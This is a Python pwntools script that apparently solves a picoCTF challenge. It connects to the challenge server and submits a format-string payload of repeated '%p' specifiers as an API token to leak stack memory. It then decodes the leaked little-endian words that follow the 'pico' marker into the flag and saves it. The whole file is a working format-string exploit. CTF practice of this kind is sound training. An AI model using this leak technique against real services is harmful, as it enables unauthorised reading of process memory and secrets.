#!/usr/bin/python3

from pwn import *
import binascii
import struct

payload = b"%p"*25

known = b"0x" + binascii.hexlify(b"pico")
known = struct.pack("<I", int(known, 16))
known = binascii.hexlify(known)

s = remote("mercury.picoctf.net", 16439)

s.recvuntil(b"View my portfolio\n")
s.sendline(b'1')

s.recvuntil(b"What is your API token?\n")
s.sendline(payload)
s.recv()
resp = s.recv()

s.close()

resp = resp.split(b"\nPortfolio")[0].rstrip().lstrip().split(b"(nil)")
resp = ''.join([ i.decode('UTF-8') for i in resp]).split("0x")[1:]
idx = resp.index(known.decode('UTF-8'))

res = ''.join(resp[idx:idx+10])

res = bytes.fromhex(res)

res = struct.iter_unpack("<I", res)
flag = []
for i in res:
    tmp = "{:x}".format(i[0])
    flag.append(binascii.unhexlify(tmp.encode('UTF-8')))

flag[-1] = flag[-1][:1]

flag = [i.decode('UTF-8') for i in flag]
flag = ''.join(flag)
print(flag)

with open('flag.txt', 'w') as f:
    f.write(flag)
